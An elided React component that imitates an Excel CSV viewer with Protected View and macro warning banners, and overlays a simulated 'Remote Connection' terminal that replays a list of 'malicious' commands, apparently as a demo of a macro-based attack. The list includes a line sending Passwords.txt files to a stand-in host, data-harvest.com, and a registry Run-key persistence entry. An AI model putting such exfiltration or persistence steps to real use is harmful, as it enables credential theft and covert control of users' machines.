...
const maliciousCommands = [
  ...
  { command: "copy /Users/*/Passwords.txt https://data-harvest.com/collect", delay: 1500 },
  ...
  { command: "startup reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", delay: 900 },
    ...
    <div className="fixed top-0 left-0 w-full h-full bg-black bg-opacity-80 flex items-center justify-center z-50">
      <div className="w-3/4 max-w-3xl h-3/4 bg-black rounded-lg border border-gray-700 overflow-hidden flex flex-col shadow-2xl">
        <div className="bg-gray-900 px-4 py-2 flex justify-between items-center">
          <div className="text-white text-sm font-mono">Terminal - Remote Connection</div>
    ...
    <div className="w-full h-full flex flex-col bg-[#f9fafb] border border-gray-300 font-[Segoe UI],sans-serif">
      ...
      <div className="bg-[#217346] border-b border-[#145a32] p-2 flex justify-between items-center">
        <div className="flex items-center gap-2">
          <span className="bg-white rounded-sm w-7 h-7 flex items-center justify-center text-[#217346] font-bold text-lg shadow">X</span>
          <span className="text-white text-lg font-semibold tracking-wide">Excel - CSV Viewer</span>
        </div>
      ...
      {protectedView && (
        <div className="bg-[#fffbe6] border-b border-[#ffe066] text-[#856404] flex items-center justify-between px-6 py-2 text-sm font-medium">
          <span>
            <span className="font-bold">PROTECTED VIEW</span>: Be careful—files from the internet can contain viruses. Unless you need to edit, it's safer to stay in Protected View.
          </span>
          <button
      ...
      {showMacroWarning && (
        <div className="bg-[#fed8b1] border-b border-[#f0ad4e] text-[#8a6d3b] flex items-center justify-between px-6 py-2 text-sm font-medium">
          <span>
            <span className="font-bold">SECURITY WARNING</span>: Macros have been disabled. This workbook contains macros that analyze and visualize your data.
          </span>
          <button
      ...
      <div className="bg-[#f3f3f3] border-b border-[#e0e0e0] flex items-center px-4 py-2 gap-2">
        <span className="bg-white border border-[#b7ddb0] rounded px-2 py-1 text-xs text-[#217346] font-semibold min-w-[40px] text-center">{selectedCellRef}</span>
        <input
          className="flex-1 border border-[#b7ddb0] rounded px-2 py-1 text-sm bg-white focus:outline-[#217346]"
          value={selectedCell ? csvData[selectedCell.row][headers[selectedCell.col]] || '' : ''}
          readOnly
      ...
      <div className="bg-[#f3f3f3] border-t border-[#e0e0e0] px-2 py-1 flex items-center gap-2">
        <div className="bg-white border border-[#b7ddb0] rounded-t px-4 py-1 text-[#217346] font-semibold shadow-sm">Sheet1</div>
        <div className="bg-[#e2efda] border border-[#b7ddb0] rounded-t px-4 py-1 text-[#217346] font-semibold">Sheet2</div>
        <button className="ml-2 bg-[#e2efda] border border-[#b7ddb0] rounded-full w-7 h-7 flex items-center justify-center text-[#217346] text-lg font-bold">+</button>
      </div>
